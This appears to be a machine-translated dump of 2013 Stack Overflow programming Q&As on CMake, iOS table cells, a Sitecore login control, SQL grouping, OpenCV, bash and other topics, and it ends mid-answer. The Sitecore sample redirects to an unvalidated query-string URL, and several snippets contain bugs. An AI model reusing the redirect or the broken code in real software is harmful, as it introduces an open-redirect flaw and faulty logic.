''' CMake 错误：此项目中使用了以下变量，但它们设置为 NOTFOUND。请设置它们或确保它们在 CMake 文件中正确设置和测试： SDL_INCLUDE_DIR 用作目录 C 中的包含目录：/Users/Administrator/Desktop/Pure265/openHEVC-master/openHEVC-master 用作目录 C 中的包含目录： /用户/管理员/桌面/Pure265/openHEVC-master/openHEVC-master/wrapper_hm

配置不完整，出现错误！'''

我很困惑为什么 cmake 找不到环境变量。（我是 Cmake 的新手，但我在这里检查过：[http](http://www.cmake.org/Wiki/CMake_Useful_Variables) : //www.cmake.org/Wiki/CMake_Useful_Variables ${SDL_INCLUDE_DIR} 应该反映到 env 变量中。）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T07:05:26.490

`${SDL_INCLUDE_DIR}`不是环境变量。它只是一个可能在 FindSDL.cmake 脚本中设置的 CMake 变量。您可以看到，因为环境变量具有 $ENV{variable_name} sintax。

您应该安装 SDL 库的开发版本。如果您查看 FindSDL.cmake 脚本，您将看到脚本在哪里搜索头文件和 lib 文件。据我所知，您必须将 SDLDIR 环境变量设置为指向 SDL 库的根文件夹。

# uitableview - 自定义 UITableViewCell 存储为 memvar 时消失

> ID：16184250
> 
> 赞同：0
> 
> 时间：2013-04-24T05:46:27.940
> 
> 标签：uitableview, nsmanagedobject, voicemail

我有一个表格视图，每个单元格都可以播放一条消息，类似于 iphone 的语音邮件表格视图，不同之处在于滑块和进度标签是单元格的一部分：（ [来源：][[apcmag.com](http://apcmag.com/images/iphone-voicemail.jpg)][）][![Apple 的语音信箱音频单元](https://i.stack.imgur.com/au9Fp.jpg)](https://i.stack.imgur.com/au9Fp.jpg)

该表与 CoreData 相关联，其中每个托管对象都包含指向表视图单元格的音频文件的链接。

由于播放按钮、滑块和音频时间进度标签是每个单元格的一部分，因此每个 AudioCell（继承自 UITableViewCell 的自定义单元格）都包含一个 AVAudioPlayer 对象来响应用户操作（例如播放、暂停等）。 .)。

当我开始播放单元格中的音频时，我需要将该单元格保存在 memvar 中，以便单元格内的 AVAudioPlayer 对象可以继续播放音频并且标签和滑块会正确更新。这是我将音频播放单元“保存”到 memvar 的代码：#pragma mark - AudioCellDelegate

```
- (void)playbackChangedForAudioCell:(AudioCell *)audioCell
{
    if (self.audioPlayingCell.isPlaying && ![self.audioPlayingCell isEqual:audioCell]) {
        [self.audioPlayingCell stopPlayback];
    }

    if (audioCell.isPlaying) {
        self.audioPlayingCell = audioCell;
    } else{
        self.audioPlayingCell = nil;
    }

    // Mark the message as played.
    Message *message = (Message *)[[self fetchedResultsControllerForTableView:self.tableView] objectAtIndexPath:audioCell.cellIndexPath];

    [self messageSeenByUser:message];
} 
```

这是相关代码，如果它与当前正在播放音频的 NSIndexPath 匹配，则从 memvar 中“恢复”单元格：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSManagedObject *managedObject = [[self fetchedResultsControllerForTableView:tableView] objectAtIndexPath:indexPath];

    UITableViewCell *cell = nil;

    // Implement any new kind of message here.
    if ([managedObject isKindOfClass:[VoicemailMessage class]])
    {
        if ([self.audioPlayingCell.cellIndexPath isEqual:indexPath])
            cell = self.audioPlayingCell;
        else {
            AudioCell *audioCell = (AudioCell *)[self setupCellForVoicemail:(VoicemailMessage*)managedObject];
            audioCell.cellIndexPath = indexPath;
            cell = audioCell;
        }
    } 
```

问题是当 NSManagedObject 在以下位置更新时：

```
- (void)messageSeenByUser:(Message *)message
{
    if (self.view.window) {
        if ([message.isNew boolValue])
        {
            message.isNew = [NSNumber numberWithBool:NO];
            [[NSNotificationCenter defaultCenter] postNotificationName:MessageBadgeNotification object:self];
        }
    }
} 
```

单元格从表格视图中消失（空间仍然存在，但我看不到单元格中的任何小部件）。

但是，如果 NSManagedObject 没有更改并且表重新加载，则单元格不会消失。

我想知道是什么导致单元格消失，某些东西必须不同于常规的表格视图更新和托管对象的更改。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:16:15.467

我让它工作了，问题似乎是当单元格需要使用托管对象更改更新时添加的淡入淡出动画：

```
- (void)controller:(NSFetchedResultsController *)controller
   didChangeObject:(id)anObject
       atIndexPath:(NSIndexPath *)indexPath
     forChangeType:(NSFetchedResultsChangeType)type
      newIndexPath:(NSIndexPath *)newIndexPath
{   
    UITableView *tableView = self.tableView;

    switch(type)
    {
        case NSFetchedResultsChangeInsert:
            [tableView insertRowsAtIndexPaths:[NSArray arrayWithObject:newIndexPath] withRowAnimation:UITableViewRowAnimationFade];
            self.insertedRow = YES;
            break;

        case NSFetchedResultsChangeDelete:
            [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
            break;

        case NSFetchedResultsChangeUpdate:
                    [tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationNone];// Do not add an animation or the voicemail cell will 
```

在 NSFetchedResultsChangeUpdate 中，我没有添加任何动画，而不是让它使用淡入淡出动画，这似乎解决了单元格消失的问题。

我仍然不确定是什么导致单元格随着淡入淡出动画消失，但至少在此更改后它现在不会消失。如果有人知道它为什么随着淡入淡出动画消失，欢迎评论。

# login - sitecore制作登录页面

> ID：16184251
> 
> 赞同：1
> 
> 时间：2013-04-24T05:46:36.603
> 
> 标签：login, sitecore, backend, login-control

我想为我的网站制作一个登录页面，但我对使用什么以及在哪里放置验证身份验证的功能感到困惑，并保持它如何跟踪会话。

我应该在控制器中执行此操作并使用 xlst 吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T08:47:58.100

如果您只是对创建注册页面/登录页面感兴趣，我建议您阅读[这篇文章](http://www.jasinskionline.com/technicalwiki/Security-Overview-Sitecore.ashx)。

以下代码片段来自那篇文章，它向您展示了登录用户控件：

```
public partial class Login : System.Web.UI.UserControl
{
    protected void Page_Load(object sender, EventArgs e)
    {
        /*--- Set the navigation url for the Register hyperlink ---*/
        var registerHyperLink = (HyperLink)uxLogin.FindControl("RegisterHyperLink");
        registerHyperLink.NavigateUrl = "~/Register.aspx?ReturnUrl=" + HttpUtility.UrlEncode(Request.QueryString["ReturnUrl"]);

        uxLogin.RememberMeSet = false;

        if (!IsPostBack)
        {
            /*--- Restore remembered username(?) ---*/
            var c = Request.Cookies["username"];

            if (c == null)
            {
                uxUsernameTextBox.Text = "";
            }
            else
            {
                uxUsernameTextBox.Text = c.Value;
                uxLogin.RememberMeSet = true;
            }
        }
    }

    protected TextBox uxUsernameTextBox { get { return uxLogin.FindControl("UserName") as TextBox; } }

    protected void uxLogin_LoggedIn(object sender, EventArgs e)
    {
        /*--- Inits ---*/
        var url = Request.QueryString["url"];

        /*--- Remember/Forget Username ---*/
        if (uxLogin.RememberMeSet)
            Response.SetCookie("username", uxUsernameTextBox.Text, 365);
        else
            Response.DeleteCookie("username", Request);

        /*--- Redirect (?) ---*/
        if (url == null)
        {
            Response.Redirect("~/"); // Main page for authenticated users
        }
        else
        {
            var url2 = Server.UrlDecode(url);
            Response.Redirect(url2);
        }
    }

    /*  This field and the LoggingIn and LoginError event procedures place the user
        in the correct domain for the current site.  This way the user doesn't have
        to specify the domain, logging in (for example) as "johndoe" instead of
        "domain\johndoe". */

    private string _usernameEntered = string.Empty;

    protected void uxLogin_LoggingIn(object sender, LoginCancelEventArgs e)
    {
        var domainUser = Sitecore.Context.Domain.GetFullName(uxLogin.UserName);

        if (System.Web.Security.Membership.GetUser(domainUser) != null)
        {
            _usernameEntered = uxLogin.UserName;
            uxLogin.UserName = domainUser;
        }
    }
    protected void uxLogin_LoginError(object sender, EventArgs e)
    {
        uxLogin.UserName = _usernameEntered;
    }
} 
```

一般来说：Sitecore 会为您跟踪登录用户，您需要做的就是让安全页面拒绝`Anonymous`用户的读取权限。然后，您可以为分配了特定角色的所有用户授予读取权限。有关这方面的更多信息，请查看[这个 StackOverflow](https://stackoverflow.com/questions/11984172/sitecore-restrict-access-to-webpage)问题（当然是答案）。

# c# - 如何在 WinRt 应用程序中将 WriteableBitmap 图像转换为字节数组

> ID：16184254
> 
> 赞同：6
> 
> 时间：2013-04-24T05:46:54.883
> 
> 标签：c#, image-processing, windows-runtime

我想在 Windows 商店 Metro 风格应用程序中使用 C# 代码将`WriteableBitmap`图像转换为数组。`Byte[]`

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-25T17:44:32.700

`WriteableBitmap`公开类型的`PixelBuffer`属性`IBuffer`- 一个 Windows 运行时接口，可以使用 .NET 转换为字节数组`Stream`

```
 byte[] ConvertBitmapToByteArray(WriteableBitmap bitmap)
    {
        using (Stream stream = bitmap.PixelBuffer.AsStream())
        using (MemoryStream memoryStream = new MemoryStream())
        {
            stream.CopyTo(memoryStream);
            return memoryStream.ToArray();
        }
    } 
```

# r - R: Fastest way to do row wise computation on multiple columns of a data frame

> ID：16184258
> 
> 赞同：4
> 
> 时间：2013-04-24T05:47:03.000
> 
> 标签：r, function, dataframe, apply

I have a data frame where I want to add another column that's a result of computation involving 3 other columns. The method I am using right now seems to be very slow. Is there any better method to do the same. Here is the approach I am using.

```
library(bitops)

GetRes<-function(A, B, C){
  tagU <- bitShiftR((A*C), 4)
  tagV <- bitShiftR(B, 2)

  x<-tagU %% 2
  y<-tagV %% 4

  res<-(2*x + y) %% 4
  return(res)
}

df <- data.frame(id=letters[1:3],val0=1:3,val1=4:6,val2=7:9)
apply(df, 1, function(x) GetRes(x[2], x[3], x[4])) 
```

My data frame is very big and it's taking ages to get this computation done. Can someone suggest me to do it better?

Thanks.

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T05:50:25.873

尝试`mapply`

```
mapply(GetRes, df[,2], df[,3], df[,4]) 
```

如果您让我们知道`bitShiftR` 来自哪个包，我们可以在更大的数据上对其进行测试，看看是否有任何性能提升。

**更新**
快速基准测试显示，`mapply`速度是您的两倍`apply`

```
microbenchmark(apply(df[,2:4], 1, function(x) GetRes(x[1], x[2], x[3])), mapply(GetRes, df[,2], df[,3], df[,4]))
Unit: microseconds
                                                      expr     min       lq   median      uq      max neval
 apply(df[, 2:4], 1, function(x) GetRes(x[1], x[2], x[3])) 196.985 201.6200 206.7515 216.187 1006.775   100
                 mapply(GetRes, df[, 2], df[, 3], df[, 4])  99.982 105.6105 108.7560 112.232  149.311   100 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T06:40:38.933

您所做的一切都已经矢量化，这比您提供的任何其他替代方案都要快得多。你可以叫这个...

```
with(df, GetRes(val0, val1, val2)) 
```

或这个

```
GetRes(df$val0, df$val1, df$val2) 
```

或这个

```
GetRes(df[,2], df[,3], df[,4]) 
```

# mysql - mySQL join with reference to parent code

> ID：16184262
> 
> 赞同：0
> 
> 时间：2013-04-24T05:47:18.913
> 
> 标签：mysql, join

UPDATE: Thanks a lot guys. You have my upvotes. My problem seem to be something else entirely.

I'm trying to get sum(QTY) from TBL_INVTY but I can't correctly join this table with TBL_ITEM. There is this column PARENT_CODE that complicates things for me. Let me better explain it like this...

TBL_ITEM

```
+------+-------------+
| CODE | PARENT_CODE | 
+------+-------------+
|    2 |        NULL |
|   2A |           2 |
|   2B |           2 |
|    3 |        NULL |
|    4 |        NULL |
+------+-------------+ 
```

TBL_INVTY

```
+------+-----+
| CODE | QTY |
+------+-----+
|    2 |   2 |
|   2A |   4 |
|   2B |   1 |
|    3 |   3 |
|    4 |   5 |
+------+-----+ 
```

And, arrive on this:

```
+------+-----+
| CODE | QTY |
+------+-----+
|    2 |   7 |
|    3 |   3 |
|    4 |   5 |
+------+-----+ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T05:54:22.367

A rough guess as to how this might work is:

```
SELECT IFNULL(tbl_item.parent_code, tbl_invty.code) AS t_code, SUM(qty) AS t_qty
  FROM tbl_invty
  LEFT JOIN tbl_item ON tbl_invty.code=tbl_item.code
  GROUP BY t_code 
```

The key here is using `IFNULL` to select between the parent ID, or if none is present, then the regular id.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T06:10:45.030

```
SELECT t_code,sum(qty) from
(SELECT IFNULL(parent_code, code) as t_code, code 
FROM tbl_item) a left join tbl_invty b on a.code=b.code
GROUP BY a.t_code 
```

[http://www.sqlfiddle.com/#!2/749b5/1](http://www.sqlfiddle.com/#!2/749b5/1)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T06:05:27.133

Try this ,

```
SELECT CONVERT(code, SIGNED) as code ,sum(QTY) from TBL_INVTY group by CONVERT(code, SIGNED); 
```

[SQL Fiddle Demo](http://sqlfiddle.com/#!2/df207/5)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-24T06:11:30.127

[SQLFIDDLE demo](http://sqlfiddle.com/#!2/069f5/4)

```
select CASE WHEN TBL_ITEM.PARENT_CODE IS NOT NULL 
       THEN
        TBL_ITEM.PARENT_CODE 
       ELSE
        TBL_ITEM.code 
       END, SUM(Qty)
FROM
TBL_INVTY
join TBL_ITEM on TBL_INVTY.code=TBL_ITEM.code

GROUP BY 
CASE WHEN TBL_ITEM.PARENT_CODE IS NOT NULL 
       THEN
        TBL_ITEM.PARENT_CODE 
       ELSE
        TBL_ITEM.code 
       END 
```

# asp.net - Counting Survey Answers of users ASP.Net

> ID：16184264
> 
> 赞同：0
> 
> 时间：2013-04-24T05:47:21.970
> 
> 标签：asp.net, session

I'm building an online application for a survey. I want to count how many users answers a specific question. My question is, how would I count the answer using Session state and application state? The answers are inputs of radio boxes and check box lists.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T05:50:23.130

将用户回复正常保存在您的数据库中，然后稍后返回并查询您的数据库以回答此类问题。

# android - 在 BroadcastReceiver 中启动活动

> ID：16184266
> 
> 赞同：1
> 
> 时间：2013-04-24T05:47:28.293
> 
> 标签：android, android-intent, broadcastreceiver

我想从 的`onReceive()`方法启动一个 Activity `BroadcastReceiver`，但 `ActivityNotFound`每次都会发生异常。请检查并告诉我我的代码有什么问题

```
 <activity android:name="NearbyFriends"></activity>

    <receiver android:name="AlarmManagerBroadcastReceiver"/> 
```

调用另一个活动的代码是

```
 Intent intent1 = new Intent(); 
    Intent1.setClassName("com.android.letscatchupclientside","com.android.letscatchupclientside.NearbyFriends");
    intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent1); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T05:49:59.820

尝试这个

```
Intent intent1 = new Intent(context, NearbyFriends.class); 
intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
context.startActivity(intent1); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T05:49:00.440

尝试

```
<activity android:name="com.android.letscatchupclientside.NearbyFriends"></activity> 
```

然后

```
Intent(this, NearbyFriends.class); 
```

# opencv - 选择区域 OpenCV

> ID：16184267
> 
> 赞同：6
> 
> 时间：2013-04-24T05:47:31.603
> 
> 标签：opencv

我是 OpenCV 的新手，我想在视频/图像中选择一个特定区域进行检测。就我而言，我想检测只在路上而不是在停车场的汽车。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-24T06:02:28.900

好吧，选择汽车需要使用训练数据。但是选择 ROI（感兴趣区域）相当简单：

考虑`img = cv2.imread(image)`

在这种情况下，您可以在代码中的某处指定一个区域：

```
sub_image = img[y:y+h, x:x+w] 
```

一旦您指定了值，这将获得 ROI，当然，不使用“x”或“y”，其中 h 是高度，w 是宽度。请记住，图像只是二维矩阵。

用于`CascadeClassifier()`从图像中选择汽车。文档可在[**此处**](http://docs.opencv.org/modules/objdetect/doc/cascade_classification.html#cascadeclassifier-cascadeclassifier)找到。OpenCV 包含可用于以 XML 文件形式进行分类的训练数据。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-24T08:04:00.663

如果您想手动选择感兴趣区域 (ROI) 对其进行一些处理，那么您可以尝试使用鼠标单击事件来选择 ROI 的起点和终点。

一旦有了起点和终点，您就可以使用它从选定区域检索图像。

可以在图像或捕获视频帧上完成。

```
bool roi_captured = false;
Point pt1, pt2;
Mat cap_img;
//Callback for mousclick event, the x-y coordinate of mouse button-up and button-down 
//are stored in two points pt1, pt2.
void mouse_click(int event, int x, int y, int flags, void *param)
{

    switch(event)
    {
        case CV_EVENT_LBUTTONDOWN:
        {
            std::cout<<"Mouse Pressed"<<std::endl;

            if(!roi_capture)
            {
                pt1.x = x;
                pt1.y = y;
            }
            else
            {
                std::cout<<"ROI Already Acquired"<<std::endl;
            }
        break;
        }
        case CV_EVENT_LBUTTONUP:
        {
          if(!got_roi)
        {
            Mat cl;
            std::cout<<"Mouse LBUTTON Released"<<std::endl;

            pt2.x = x;
            pt2.y = y;
            cl = cap_img.clone();
            Mat roi(cl, Rect(pt1, pt2));
            Mat prev_imgT = roi.clone();
            std::cout<<"PT1"<<pt1.x<<", "<<pt1.y<<std::endl;
            std::cout<<"PT2"<<pt2.x<<","<<pt2.y<<std::endl;

            imshow("Clone",cl);

            got_roi = true;
        }
        else
        {
            std::cout<<"ROI Already Acquired"<<std::endl;
        }
        break;  
        }

    }

}
//In main open video and wait for roi event to complete by the use.
// You capture roi in pt1 and pt2 you can use the same coordinates for processing // //subsequent frame
int main(int argc, char *argv[])
{
    int frame_num = 0;
    int non_decode_frame =0;
    int count = 1, idx =0;
    int frame_pos =0;

    std::cout<<"Video File "<<argv[1]<<std::endl;

    cv::VideoCapture input_video(argv[1]);

    namedWindow("My_Win",1);

    cvSetMouseCallback("My_Win", mouse_click, 0);

    sleep(1);

    while(input_video.grab())
    {
        cap_img.release();

        if(input_video.retrieve(cap_img))
        {
            imshow("My_Win", cap_img);
            if(!got_roi)
            {
                            //Wait here till user select the desire ROI
                waitKey(0);
            }
            else
            {
                std::cout<<"Got ROI disp prev and curr image"<<std::endl;
                std::cout<<"PT1"<<pt1.x<<" "<<pt1.y<<std::endl;
                std::cout<<"PT2"<<pt2.x<<" "<<pt2.y<<std::endl;

                Mat curr_img_t1;
                Mat roi2(cap_img,Rect(pt1, pt2));
                Mat curr_imgT = roi2.clone();
                cvtColor(curr_imgT, curr_img_t1, CV_RGB2GRAY);

                    imshow("curr_img", curr_img);

            // Do remaining processing here on capture roi for every frame
                               waitKey(1);
                        }
                  }
}
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-03-17T20:52:19.933

您没有使用您正在编写的编程语言进行标记。无论如何，我用python回答你。（如果需要，您可以轻松地将其转换为 C++）

```
def mouse_drawing(event, x, y, flags, params):
    if event == cv2.EVENT_LBUTTONDOWN:
        car = img[y: y + carheight, x: x + carwidth]
        cv2.imwrite("car", car)

cv2.namedWindow("my_img")
cv2.setMouseCallback("my_img", mouse_drawing)

while True:
    cv2.imshow("my_img", img)
    key = cv2.waitKey(1)
    if key == 27:
        break 
```

正如在其他答案中所说，如果您想自动找到汽车，那将是另一个问题，并且与训练数据和其他事情有关。

# javascript - How to set maxlength for my texteditor

> ID：16184269
> 
> 赞同：0
> 
> 时间：2013-04-24T05:47:49.227
> 
> 标签：javascript, jquery, html

I want to set the maximum length of character for my texteditor. Users will enter text in Iframe in the editor. I am getting the characters through the `keydown` event. I get the "maxlength" by calculating length with text & maxlength and by setting keyflag as false.

My problem is that I now have to allow the user to edit text when user press backspace, delete, ctrl+special keys.

Is there any other general ways to achieve the maxlength property?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:02:23.737

一旦达到最大限制，您可以执行以下操作

```
var text = $('#editor').text().substring(0,maxlength); 
```

可以作为值添加到编辑器中的文本

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T05:55:08.690

兄弟们，我终于做到了。。

在 keyDown 事件和使用键码我们可以实现这些功能......

```
keydown(e)
{
 if(e.keyCode==8) //for backspace key
{
 // your code
}
} 
```

同样我们可以编写我们需要的函数

# c# - Omit nodes in XML based on Attribute

> ID：16184276
> 
> 赞同：1
> 
> 时间：2013-04-24T05:48:10.823
> 
> 标签：c#, xml, linq-to-xml

Using C# ***[LINQ to XML](http://msdn.microsoft.com/en-us/library/bb387098.aspx)***

I'm trying to omit the first and last nodes in the following XML.

I'm trying to process each node between `<node id="2" one="start">` and `<node id="4" one="finish">`

```
<root>
  <node id="1">
    <element two="3"/>
    <element two="7"/>
  </node>
  <node id="2" one="start">
    <element two="1"/>
    <element two="2"/>
  </node>
  <node id="3">
    <element two="4"/>
    <element two="4"/>
    <element two="4"/>
    <element two="2"/>
    <element two="6"/>
  </node>
  <node id="4">
    <element two="3"/>
    <element two="7"/>
  </node>
  <node id="5" one="finish">
    <element two="3"/>
    <element two="7"/>
  </node>
  <node id="6">
    <element two="3"/>
    <element two="7"/>
  </node>
<root> 
```

Is there a to standard approach to this?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T09:13:59.687

如果您有一系列`XElement`s 并且您想根据您的条件过滤它们，我认为 LINQ 中没有任何内置的东西可以做到这一点（有`SkipWhile()`并且`TakeWhile()`做类似的事情）。

我认为您应该做的是创建一个通用扩展方法，该方法根据第一个和最后一个条件过滤集合，例如：

```
public static IEnumerable<T> GetBetween<T>(
    this IEnumerable<T> source,
    Func<T, bool> firstPredicate, Func<T, bool> lastPredicate)
{
    bool foundFirst = false;
    foreach (var item in source)
    {
        if (!foundFirst)
            foundFirst = firstPredicate(item);

        if (foundFirst)
        {
            yield return item;

            if (lastPredicate(item))
                break;
        }
    }
} 
```

然后你会像这样使用它：

```
elements.GetBetween(
    e => (string)e.Attribute("one") == "start",
    e => (string)e.Attribute("one") == "finish") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:33:52.813

我用一些非常简单的逻辑来处理这个问题。

```
bool processFlag = false; 
```

将这个布尔值从node.element.attribute = "start" 切换到`false`= "finish" 就可以了！`true``false`

# c# - Is it possible to change a url column in a GridView (HyperLink or HyperLinkField) to a normal text?

> ID：16184280
> 
> 赞同：0
> 
> 时间：2013-04-24T05:48:34.097
> 
> 标签：c#, asp.net, vb.net

I have a GridView which I export to Excel ([export gridview to excel file](https://stackoverflow.com/questions/8094573/export-gridview-to-excel-file)) and it works.

But the problem is that the GridView contains a `HyperLinkField` column so its gets exported to excel as a `URL` while I want it to be as a text in Excel and not as a link, how do I do this?

The `HyperLinkField` column, in gridview, that I have is:

```
<asp:HyperLinkField DataNavigateUrlFields="learntable_id" DataNavigateUrlFormatString="~/page2.aspx?learntable_id={0}" HeaderText="Learning Description" DataTextField="learntable_desc" /> 
```

## I tried to fix the problem with the following:

*   First I gave an ID to the url column so I can be able to work with that column in codebehind so I replace the Hyperlinkfield with a Hyperlink like this:

    ```
     <asp:TemplateField HeaderText="Learning Description">
                <ItemTemplate>
                    <asp:HyperLink id="hyperlinkcolumn" runat="server" NavigateUrl='<%# "~/page2.aspx?learntable_id=" & Eval("learntable_id") %>' text='<%# Eval("learntable_desc") %>' ></asp:HyperLink>
                </ItemTemplate>
            </asp:TemplateField> 
    ```

*   and in the Export to Excel code in page behind I try to `convert` that column to a text but I fail and I am not sure if I do it right:

    ```
    For Each gr As GridViewRow In GridView1.Rows
        Convert.ToString(CType(gr.Cells(1).FindControl("hyperlinkcolumn").ToString, String))
    Next 
    ```

But I can't arrive to change the link column to a text column, help please.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:40:49.047

您可以删除所有链接并将它们替换为文本控件。

这是 C# 代码-

```
private void RemoveLinks(Control grdView)
    {
        LinkButton lb = new LinkButton();
        Literal l = new Literal();

        for (int i = 0; i < grdView.Controls.Count; i++)
        {
            if (grdView.Controls[i].GetType() == typeof(LinkButton))  // or hyperlink
            {
                l.Text = (grdView.Controls[i] as LinkButton).Text;
                grdView.Controls.Remove(grdView.Controls[i]);
                grdView.Controls.AddAt(i, l);
            }
            if (grdView.Controls[i].HasControls())
            {
                RemoveLinks(grdView.Controls[i]);
            }
        }        
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T07:29:04.630

您可以通过 JavaScript 实现这一点，通过 Id 从 Link 中删除下划线，或者为要从中删除下划线的 HyperLink 分配 Css 类。

使用链接 ID：

```
$(document).ready(function(){
  $('#HyperLinkId').css('textDecoration','none');
}); 
```

带有链接 CssClass：

```
$(document).ready(function(){
    $('.HyperlinkClass').css('textDecoration','none');
}); 
```

**更新1：**

您也可以从 HyperLink jQuery 中删除 href 属性：

使用链接 ID：

```
$(document).ready(function(){
    $('#HyperLinkId').removeAttr("href");
}); 
```

带有链接 CssClass：

```
$(document).ready(function(){
    $('.HyperlinkClass').removeAttr("href");
}); 
```

# bash - bash: can read be used as a command or expression?

> ID：16184281
> 
> 赞同：0
> 
> 时间：2013-04-24T05:48:41.550
> 
> 标签：bash, shell, unix, zsh

I want to make a oneliner loop that reads and checks what it read.

This surely won't work:

```
while [[ read line != "q" ]]; do; echo "enter q to quit: "; done 
```

Zsh here tells me `condition expected: read`.

Perhaps `read` does not even have this concept of a return value.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T05:56:33.533

[Bash 陷阱#9](http://mywiki.wooledge.org/BashPitfalls#if_.5Bgrep_foo_myfile.5D)：

> 如果接受命令。[ 是一个命令，而不是 if 语句的语法标记。它等价于 test 命令，只是最后一个参数必须是 ]。

`[[`不是`if`条件的特殊语法。`[[`本身就是一个命令。尝试这样的循环：

```
while read -r line; do
  [[ $line = "q" ]] && break
  # more code
done 
```

`read`当它无法读取表达式并且`[[`是命令时返回失败，所以这有效。有关详细信息，请参阅[http://mywiki.wooledge.org/BashFAQ/001](http://mywiki.wooledge.org/BashFAQ/001)。

注意：将`-r`开关添加到`read`是一个好主意 - 它可以防止输入中的反斜杠发生有趣的事情。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-24T05:52:59.093

```
while read line; do; [[ "$line" == 'q' ]] && break; done; 
```

似乎工作。

但我不确定为什么我不能用 替换`[[ ]]`，`[ ]`它奇怪地失败了：

```
$ bash
bash-3.2$ while true; do; read line; [ "$line" == 'q' ] && break; done;
bash: syntax error near unexpected token ';'                                       

$ while true; do; read line; [ "$line" == 'q' ] && break; done;
ajlfkj
zsh: = not found 
```

# web-applications - Visual Studio 像 mvc4 中的可折叠、可隐藏和可停靠窗口

> ID：16184286
> 
> 赞同：0
> 
> 时间：2013-04-24T05:49:10.677
> 
> 标签：web-applications, asp.net-mvc-4

Visual Studio 2012 像 mvc4 网站中的可折叠、可隐藏和可停靠窗口...

他们有可能吗？任何帮助我开始解决这个问题将不胜感激。我正在使用VS2012。

需要在 MVC4 中创建一个类似于 webparts 的网站，但似乎这不是一个简单的任务..请告知...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T07:32:13.890

我认为没有任何简单的插件可以以完全相同的方式运行，但是使用 javascript 库（如 jquery UI 或 Kendo UI）提供的一些小部件并自己编写一些 jquery 和 css 就可以做到这一点。看看这些以获得一些想法：

[http://demos.kendoui.c​​om/web/splitter/index.html](http://demos.kendoui.com/web/splitter/index.html)

[http://jqueryui.com/dialog/](http://jqueryui.com/dialog/)

# regex - Hide/Remove first line from total address block in JSP

> ID：16184288
> 
> 赞同：0
> 
> 时间：2013-04-24T05:49:19.440
> 
> 标签：regex, string, jsp, trim, texttrimming

I was calling a method as given here - to print the total address block.

```
Address add = AddressManager.getMyAddress(someId);
String totalAddr = FlexibleAddress.getAddressAsString(add , par1, par2);
out.print(totalAddr.toString()); 
```

The result of `totalAddr.toString()` is getting like ,

```
MyName
AddressLine1
AddressLine2
City 
```

I need to remove the first line (ie `MyName` here) from this total address block. I have to cut the first line from the jsp page where it is displaying.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:09:52.470

试试下面的代码

```
totalAddr = totalAddr.substring(totalAddr.indexOf('\n')+1);
out.print(totalAddr.toString()); 
```

# sql-server - 按 ID 合并记录

> ID：16184295
> 
> 赞同：1
> 
> 时间：2013-04-24T05:49:53.877
> 
> 标签：sql-server, sql-server-2008

我正在使用 SQLServer2008。

我的存储过程的输出是：

```
--------------------------------------------------------
 BrokerCode | MemberId  |  FY    |    SY    |    TY    |
--------------------------------------------------------
    104     |    24     |  1140  |    0.00  |    0.00  |
--------------------------------------------------------
    104     |    24     |  1140  |    570   |    0.00  |
--------------------------------------------------------
    104     |    30     |  500   |    0.00  |    0.00  |
--------------------------------------------------------
    104     |    30     |  500   |    360   |    0.00  |
-------------------------------------------------------- 
```

我想得到这样的结果：

```
--------------------------------------------------------
 BrokerCode | MemberId  |   FY    |    SY    |    TY    |
--------------------------------------------------------
    104     |    24     |   1140  |    570   |    0.00  |
--------------------------------------------------------
    104     |    30     |   500   |    360   |    0.00  |
-------------------------------------------------------- 
```

所以我尝试使用：

```
WITH CTE AS ( 
SELECT BrockerCode,
     MemberId,

     RN=ROW_NUMBER()OVER(PARTITION BY MemberId ORDER BY MemberID),
     FY=MIN(FY)OVER(PARTITION BY MemberId),
     SY=MIN(SY)OVER(PARTITION BY MemberId),
     TY=MIN(TY)OVER(PARTITION BY MemberId)

     FROM   @tablePromotee )
SELECT MemberId,BrockerCode,FY,SY,TY  FROM  CTE  WHERE  RN = 1 
```

但它仍然显示错误的结果...请帮助我..我错在哪里？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:06:13.753

`Common Table Expression`这里真的不需要。一个更简单的查询：

```
SELECT 
      BrokerCode,
      MemberId,
      MAX(FY) AS FY,
      MAX(SY) AS SY,
      MAX(TY) AS TY
FROM YourTable
GROUP BY BrokerCode, MemberId 
```

[SQL 小提琴演示](http://www.sqlfiddle.com/#!3/68619/5)

* * *

## 回答 #2

> 赞同：1
> 
